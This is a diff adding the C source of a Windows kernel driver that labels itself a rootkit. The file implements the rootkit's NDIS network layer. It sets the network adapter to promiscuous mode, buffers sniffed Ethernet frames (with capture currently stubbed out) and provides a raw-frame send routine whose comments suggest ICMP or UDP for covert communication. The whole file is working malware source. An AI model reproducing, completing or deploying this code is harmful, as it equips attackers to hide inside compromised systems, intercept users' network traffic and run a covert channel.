@@ -1,0 +1,558 @@
+
+#include "rk_driver.h"
+#include "rk_packet.h"
+
+/* Packet Sniffer I/O routines */
+
+/* ________________________________________________________________________________
+ . This constant is used for places where NdisAllocateMemory
+ . needs to be called and the HighestAcceptableAddress does
+ . not matter.
+ . ________________________________________________________________________________ */
+NDIS_PHYSICAL_ADDRESS HighestAcceptableMax =
+    NDIS_PHYSICAL_ADDRESS_CONST(-1,-1);
+
+
+BFRF GlobalPtrArray[MAX_POSITIONS]; /* max recv packets waiting */
+ULONG GPFront = 0;
+
+
+/* ______________________________________________________________________
+ . Send raw data over the network.  Use this function to send a frame of
+ . data out over the wire.  If you expect the packet to get anywhere, you
+ . will, of course, need to assemble a valid TCP/IP packet, as well as the
+ . Ethernet frame.  It is suggested that you use something like ICMP 
+ . or UDP to communicate - and ignore trying to keep a TCP session open.
+ . Otherwise, you are going to have to implement your own TCP stack inside
+ . this driver (echk!).
+ . ______________________________________________________________________ */
+VOID SendRaw(char *c, int len)
+{
+	NDIS_STATUS aStat;
+	
+	DbgPrint("ROOTKIT: SendRaw called\n");
+
+	/* aquire lock, release only when send is complete */
+	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+	if(gOpenInstance && c){
+		PNDIS_PACKET aPacketP;
+		NdisAllocatePacket( &aStat, 
+							&aPacketP, 
+							gOpenInstance->mPacketPoolH
+							);
+		if(NDIS_STATUS_SUCCESS == aStat){
+			PVOID aBufferP;
+			PNDIS_BUFFER anNdisBufferP;
+
+			NdisAllocateMemory( &aBufferP,
+								len,
+								0,
+								HighestAcceptableMax );
+			memcpy( aBufferP, (PVOID)c, len);
+			NdisAllocateBuffer( &aStat, 
+								&anNdisBufferP, 
+								gOpenInstance->mBufferPoolH,
+								aBufferP,
+								len
+								);
+			if(NDIS_STATUS_SUCCESS == aStat){
+				RESERVED(aPacketP)->Irp = NULL; /* so our OnSendDone() knows this is local */
+				NdisChainBufferAtBack(aPacketP, anNdisBufferP);
+				NdisSend( &aStat, gOpenInstance->AdapterHandle, aPacketP );
+			}
+		}
+	}
+	/* release so we can send next.. */
+	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+}
+
+
+
+
+/* NOTE:
+ * There are alot of functions that should be dealing with IRP's, 
+ * but since this rootkit is not currently accessable to user-mode, 
+ * all of this is irrelevant .. so I leave most of the IRP processing 
+ * out for now... 
+ */
+
+
+NTSTATUS 
+OnWrite( IN PDEVICE_OBJECT theDevObj, IN PIRP theIrp ) 
+{
+    PIO_STACK_LOCATION  anIrpStackP;
+    PNDIS_PACKET        pPacket;
+    NDIS_STATUS         aStatus;
+
+	DbgPrint("ROOTKIT: OnWrite called \n");
+
+    anIrpStackP = IoGetCurrentIrpStackLocation(theIrp);
+
+    NdisAllocatePacket( &aStatus, &pPacket, gOpenInstance->mPacketPoolH );
+    if (aStatus != NDIS_STATUS_SUCCESS) 
+	{
+        theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
+        IoCompleteRequest(theIrp, IO_NO_INCREMENT);
+		return STATUS_UNSUCCESSFUL;
+    }
+
+    RESERVED(pPacket)->Irp=theIrp;
+    NdisChainBufferAtFront(pPacket,theIrp->MdlAddress);
+
+    IoMarkIrpPending(theIrp);
+    theIrp->IoStatus.Status = STATUS_PENDING;
+    /* send the data down to the MAC driver */
+    NdisSend( &aStatus, gOpenInstance->AdapterHandle, pPacket);
+    if (aStatus != NDIS_STATUS_PENDING) 
+	{
+        OnSendDone( gOpenInstance, pPacket, aStatus );
+    }
+    return(STATUS_PENDING);
+}
+
+VOID 
+OnOpenAdapterDone( IN NDIS_HANDLE ProtocolBindingContext, 
+				   IN NDIS_STATUS Status, 
+				   IN NDIS_STATUS OpenErrorStatus ) 
+{
+    PIRP              Irp = NULL;
+    POPEN_INSTANCE    Open = NULL;
+	NDIS_REQUEST      anNdisRequest;
+	BOOLEAN           anotherStatus;
+	ULONG			  aMode = NDIS_PACKET_TYPE_PROMISCUOUS;
+
+	DbgPrint("ROOTKIT: OnOpenAdapterDone called\n");
+
+	/* set card into promiscuous mode */
+	if(gOpenInstance){
+		//
+		//	Initializing the Event
+		//
+		NdisInitializeEvent(&gOpenInstance->Event);
+
+		anNdisRequest.RequestType = NdisRequestSetInformation;
+		anNdisRequest.DATA.SET_INFORMATION.Oid = OID_GEN_CURRENT_PACKET_FILTER;
+		anNdisRequest.DATA.SET_INFORMATION.InformationBuffer = &aMode;
+		anNdisRequest.DATA.SET_INFORMATION.InformationBufferLength = sizeof(ULONG);
+
+		NdisRequest( &anotherStatus,
+					 gOpenInstance->AdapterHandle,
+					 &anNdisRequest
+					 );
+	}
+    return;
+}
+
+
+VOID 
+OnCloseAdapterDone( IN NDIS_HANDLE ProtocolBindingContext, 
+				    IN NDIS_STATUS Status ) 
+{
+	DbgPrint("ROOTKIT: OnCloseAdapterDone called\n");
+
+	if(NULL != gOpenInstance)
+	{
+		gOpenInstance->Status = Status;
+		NdisSetEvent(&gOpenInstance->Event);
+	}
+    return;
+}
+
+VOID 
+OnSendDone( IN NDIS_HANDLE ProtocolBindingContext, 
+		    IN PNDIS_PACKET pPacket, 
+			IN NDIS_STATUS Status ) 
+{
+    PNDIS_BUFFER anNdisBufferP;
+	PVOID aBufferP;
+	UINT aBufferLen;
+	PIRP Irp;
+    
+
+	DbgPrint("ROOTKIT: OnSendDone called\n");
+
+	//__asm int 3
+
+	/* aquire lock, release only when send is complete */
+	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+
+	Irp=RESERVED(pPacket)->Irp;
+	if(Irp)
+	{
+		NdisReinitializePacket(pPacket);
+		NdisFreePacket(pPacket);
+
+		Irp->IoStatus.Status = NDIS_STATUS_SUCCESS;
+		Irp->IoStatus.Information = 0; /* never reports back anything sent.. */ 
+		IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	}
+	else
+	{
+		// if no Irp, then it was local
+		NdisUnchainBufferAtFront( pPacket,
+								  &anNdisBufferP );
+		if(anNdisBufferP)
+		{
+			NdisQueryBuffer( anNdisBufferP,
+							 &aBufferP,
+							 &aBufferLen);
+			if(aBufferP)
+			{
+				NdisFreeMemory( aBufferP,
+								aBufferLen,
+								0 );
+			}
+			NdisFreeBuffer(anNdisBufferP);
+		}
+		NdisReinitializePacket(pPacket);
+		NdisFreePacket(pPacket);
+	}
+
+	/* release so we can send next.. */
+	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+
+    return;
+}
+
+VOID 
+OnTransferDataDone ( IN NDIS_HANDLE thePBindingContext, 
+					 IN PNDIS_PACKET thePacketP, 
+					 IN NDIS_STATUS theStatus, 
+					 IN UINT theBytesTransfered ) 
+{
+	PIO_STACK_LOCATION   anIrpStackP;
+	PNDIS_BUFFER		 aNdisBufP;
+	PVOID			     aBufferP;
+	ULONG				 aBufferLen;
+	PVOID			     aHeaderBufferP;
+	ULONG				 aHeaderBufferLen;
+    POPEN_INSTANCE       anOpenP;
+    PIRP                 anIrpP;
+    PMDL                 aMdlP;
+	
+
+	DbgPrint("ROOTKIT: OnTransferDataDone called\n");
+
+	//__asm int 3
+
+	aBufferP = RESERVED(thePacketP)->pBuffer;
+	aBufferLen = theBytesTransfered;
+	aHeaderBufferP = RESERVED(thePacketP)->pHeaderBufferP;
+	aHeaderBufferLen = RESERVED(thePacketP)->pHeaderBufferLen;
+
+	if(aBufferP)
+	{
+		ULONG aPos = 0;
+		KIRQL aIrql;
+
+		DbgPrint("rootkit: OTDD: KeAcquireSpinLock\n");
+		KeAcquireSpinLock(&GlobalArraySpinLock, &aIrql);
+		// ----------------------------------------------------------
+		aPos = GPFront + 1;
+		if(aPos == MAX_POSITIONS){ 
+			DbgPrint("rootkit: OTDD: aPos == MAX_POSITIONS\n");	
+			aPos = 0;
+		}
+		/* if the queue is full, then just delete */
+		if(NULL == GlobalPtrArray[aPos].mBuf)
+		{ 
+			/* probably shouldn't play w/ memory
+			 * while we own this spinlock, seems to
+			 * work OK, come up w/ better solution
+			 * l8tr...
+			 */
+			char *aPtr = NULL;
+
+			DbgPrint("rootkit: OTDD: NULL == GlobalPtrArray[aPos].mBuf\n");
+
+			GlobalPtrArray[aPos].mBuf = ExAllocatePool(NonPagedPool, (aHeaderBufferLen + aBufferLen) );
+			aPtr = GlobalPtrArray[aPos].mBuf;
+
+			memcpy( aPtr,
+				    aHeaderBufferP,
+					aHeaderBufferLen );
+			memcpy( aPtr + aHeaderBufferLen,
+					aBufferP,
+					aBufferLen );
+
+			GlobalPtrArray[aPos].mLen = (aHeaderBufferLen + aBufferLen);
+			GPFront = aPos;
+
+			// ------------------------------------------------------
+			DbgPrint("rootkit: OTDD: KeReleaseSpinlock\n");
+			KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
+
+			ExFreePool(aBufferP); // we are done w/ this
+			ExFreePool(aHeaderBufferP); // we are done w/ this
+		}
+		else{
+			// ------------------------------------------------------
+			DbgPrint("rootkit: OTDD: KeReleaseSpinlock\n");
+			KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
+			DbgPrint("NonPaged Buffers are full, dropping a packet!!\n");
+			ExFreePool(aBufferP); // we are full
+			ExFreePool(aHeaderBufferP); // we are full
+		}
+		
+	}
+
+	/* free buffer */
+	DbgPrint("rootkit: OTDD: NdisUnchainBufferAtFront\n");
+	NdisUnchainBufferAtFront(thePacketP, &aNdisBufP); // Free buffer descriptor.
+    if (aNdisBufP) NdisFreeBuffer(aNdisBufP);
+
+    /* recycle */
+	DbgPrint("rootkit: OTDD: NdisReinitializePacket\n");
+    NdisReinitializePacket(thePacketP);
+    NdisFreePacket(thePacketP);
+    return;
+}
+
+VOID OnResetDone( IN NDIS_HANDLE ProtocolBindingContext, 
+				  IN NDIS_STATUS Status ) 
+{   
+	DbgPrint("ROOTKIT: OnResetDone called\n");
+    return;
+}
+
+VOID 
+OnRequestDone( IN NDIS_HANDLE ProtocolBindingContext, 
+			   IN PNDIS_REQUEST NdisRequest, 
+			   IN NDIS_STATUS Status ) 
+{
+	DbgPrint("ROOTKIT: OnRequestDone called\n");
+    return;
+}
+
+
+/* a packet has arrived */
+NDIS_STATUS 
+OnReceiveStub( IN NDIS_HANDLE ProtocolBindingContext, /* our open structure */
+			   IN NDIS_HANDLE MacReceiveContext, 
+			   IN PVOID HeaderBuffer, /* ethernet header */
+			   IN UINT HeaderBufferSize, 
+			   IN PVOID LookAheadBuffer, /* it is possible to have entire packet in here */
+			   IN UINT LookaheadBufferSize, 
+			   UINT PacketSize ) 
+{
+	POPEN_INSTANCE      Open;
+
+    PNDIS_PACKET        pPacket;
+    PNDIS_BUFFER		pBuffer;
+
+	ULONG               SizeToTransfer = 0;
+    NDIS_STATUS         Status;
+    UINT                BytesTransfered;
+    ULONG               BufferLength;
+
+    PPACKET_RESERVED    Reserved;
+	NDIS_HANDLE			BufferPool;
+	PVOID				aTemp;
+	UINT				Frame_Type = 0;
+	
+	DbgPrint("ROOTKIT: OnReceiveStub called\n");
+	//__asm int 3
+
+	SizeToTransfer = PacketSize;    
+    Open = (POPEN_INSTANCE) ProtocolBindingContext;
+
+    if ((HeaderBufferSize > ETHERNET_HEADER_LENGTH) 
+		|| 
+		(SizeToTransfer > (1514 - ETHERNET_HEADER_LENGTH) ))
+	{
+		DbgPrint("ROOTKIT: OnReceiveStub returning unaccepted packet\n");
+        return NDIS_STATUS_NOT_ACCEPTED;
+	}
+
+#if 0 // NOTE we need to get arp results back
+	memcpy(&Frame_Type, ( ((char *)HeaderBuffer) + 12), 2);
+	/*
+	 * ignore everything 
+	 * except IP (network byte order) 
+	 */
+	if(Frame_Type != 0x0008)
+	{
+		return NDIS_STATUS_NOT_ACCEPTED; 
+	}
+#endif
+	
+	/* store ethernet payload */
+	// FIXME testing - I don't want to capture packets
+	//aTemp = ExAllocatePool( NonPagedPool, (1514 - ETHERNET_HEADER_LENGTH ));
+	aTemp = NULL;
+	if(aTemp)
+	{
+		// NOTE Nov. 23
+		// ------------
+		// Lockup is occuring here on Win2K, not on NT4.0 (?)
+		// need to investigate
+		
+		DbgPrint("rootkit: ORI: store ethernet payload\n");
+		RtlZeroMemory( aTemp, (1514 - ETHERNET_HEADER_LENGTH ));
+		NdisAllocatePacket(
+			&Status,
+			&pPacket,
+			Open->mPacketPoolH /* previous NdisAllocatePacketPool */
+			);
+		if (NDIS_STATUS_SUCCESS == Status)
+		{
+			DbgPrint("rootkit: ORI: store ethernet header\n");
+			/* store ethernet header */
+			RESERVED(pPacket)->pHeaderBufferP = ExAllocatePool(NonPagedPool, ETHERNET_HEADER_LENGTH);
+			DbgPrint("rootkit: ORI: checking ptr\n");
+			if(RESERVED(pPacket)->pHeaderBufferP)
+			{
+				DbgPrint("rootkit: ORI: pHeaderBufferP\n");
+				RtlZeroMemory(RESERVED(pPacket)->pHeaderBufferP, ETHERNET_HEADER_LENGTH);
+				memcpy(RESERVED(pPacket)->pHeaderBufferP, (char *)HeaderBuffer, ETHERNET_HEADER_LENGTH);
+				RESERVED(pPacket)->pHeaderBufferLen = ETHERNET_HEADER_LENGTH;
+				NdisAllocateBuffer(
+					&Status,
+					&pBuffer,
+					Open->mBufferPoolH,
+					aTemp,
+					(1514 - ETHERNET_HEADER_LENGTH)
+					);
+
+				if (NDIS_STATUS_SUCCESS == Status)
+				{
+					DbgPrint("rootkit: ORI: NDIS_STATUS_SUCCESS\n");
+					RESERVED(pPacket)->pBuffer = aTemp; /* I have to release this later */
+
+					/*  Attach our buffer to the packet.. important */
+					NdisChainBufferAtFront(pPacket, pBuffer);
+
+					DbgPrint("rootkit: ORI: NdisTransferData\n");
+					NdisTransferData(
+						&(Open->mStatus),
+						Open->AdapterHandle,
+						MacReceiveContext,
+						0,
+						SizeToTransfer,
+						pPacket,
+						&BytesTransfered);
+
+					if (Status != NDIS_STATUS_PENDING) 
+					{
+						DbgPrint("rootkit: ORI: did not pend\n");
+						/*  If it didn't pend, call the completion routine now */
+						OnTransferDataDone(
+							Open,
+							pPacket,
+							Status,
+							BytesTransfered
+							);
+					}
+					return NDIS_STATUS_SUCCESS;	
+				}
+				ExFreePool(RESERVED(pPacket)->pHeaderBufferP);
+			}
+			else
+			{
+				DbgPrint("rootkit: ORI: pHeaderBufferP allocation failed!\n");
+			}
+			DbgPrint("rootkit: ORI: NdisFreePacket()\n");
+			NdisFreePacket(pPacket);	
+		}
+		DbgPrint("rootkit: ORI: ExFreePool()\n");
+		ExFreePool(aTemp);
+	}
+	return NDIS_STATUS_NOT_ACCEPTED;
+}
+
+
+VOID 
+OnReceiveDoneStub( IN NDIS_HANDLE ProtocolBindingContext ) {
+	DbgPrint("ROOTKIT: OnReceiveDoneStub called\n");
+    return;
+}
+
+
+VOID 
+OnStatus( IN NDIS_HANDLE ProtocolBindingContext, 
+		  IN NDIS_STATUS Status, 
+		  IN PVOID StatusBuffer, 
+		  IN UINT StatusBufferSize ) {
+    DbgPrint("ROOTKIT: OnStatus called\n");
+	return;
+}
+
+
+VOID 
+OnStatusDone( IN NDIS_HANDLE ProtocolBindingContext ) {
+	DbgPrint("ROOTKIT:OnStatusDone called\n");
+    return;
+}
+
+
+NTSTATUS 
+OnReadStub( IN PDEVICE_OBJECT theDevObj, IN PIRP theIrp ) 
+{
+	POPEN_INSTANCE      anOpenP;
+    PIO_STACK_LOCATION  anIrpStackP;
+    NDIS_STATUS         aStatus;
+	PVOID				aDataBufferP = NULL;
+	ULONG				aPosition = 0;
+	KIRQL				aIrql;
+
+    DbgPrint("ROOTKIT: OnReadStub called\n");
+
+    anIrpStackP = IoGetCurrentIrpStackLocation(theIrp);
+    anOpenP = anIrpStackP->FileObject->FsContext;
+    
+    /* is the buffer is atleast big enough to hold the ethernet header? */
+    if (anIrpStackP->Parameters.Read.Length < ETHERNET_HEADER_LENGTH)
+	{
+		/* a little cramped! */
+        theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
+		IoCompleteRequest(theIrp, IO_NO_INCREMENT);
+        return STATUS_UNSUCCESSFUL;
+    }
+
+	KeAcquireSpinLock(&GlobalArraySpinLock, &aIrql);
+	// -------------------------------------------------------------------	
+	/* start at zero if needed */
+	aPosition = (MAX_POSITIONS != (GPFront + 1)) ? (GPFront + 1) : 0; 
+
+	/* circle to zero if needed, find first non-null ptr */
+	while( (NULL == GlobalPtrArray[aPosition].mBuf) &&  aPosition != GPFront )
+	{
+		if(MAX_POSITIONS == ++aPosition) aPosition = 0; 
+	}
+
+	/* if circular buffer was empty, this will point to null */
+	if(NULL != GlobalPtrArray[aPosition].mBuf)
+	{
+		PVOID aVoidP = NULL;
+		ULONG aLength = 0;
+
+		aVoidP = GlobalPtrArray[aPosition].mBuf;
+		aLength = (GlobalPtrArray[aPosition].mLen < anIrpStackP->Parameters.Read.Length) ? 
+			GlobalPtrArray[aPosition].mLen : anIrpStackP->Parameters.Read.Length;
+
+		GlobalPtrArray[aPosition].mBuf = NULL;
+		
+		/* do not play w/ memory why we own the spinlock */
+		KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
+		// ---------------------------------------------------------------
+		/* copy our buffer into theIrp's actual readbuffer.. 
+		 * a little less performance oriented than using Mdl's to
+		 * the memory directly... oh well. */
+		NdisMoveMappedMemory(
+			MmGetSystemAddressForMdl(theIrp->MdlAddress),
+			aVoidP,
+			aLength
+			);
+		theIrp->IoStatus.Information = aLength; /* so user knows how much they read */
+		ExFreePool(aVoidP);
+		IoCompleteRequest(theIrp, IO_NO_INCREMENT);
+		return NDIS_STATUS_SUCCESS;
+	}
+	KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
+	// -------------------------------------------------------------------
+
+	/* No packets were ready... */
+    theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
+	IoCompleteRequest(theIrp, IO_NO_INCREMENT);
+        return STATUS_UNSUCCESSFUL;
+}
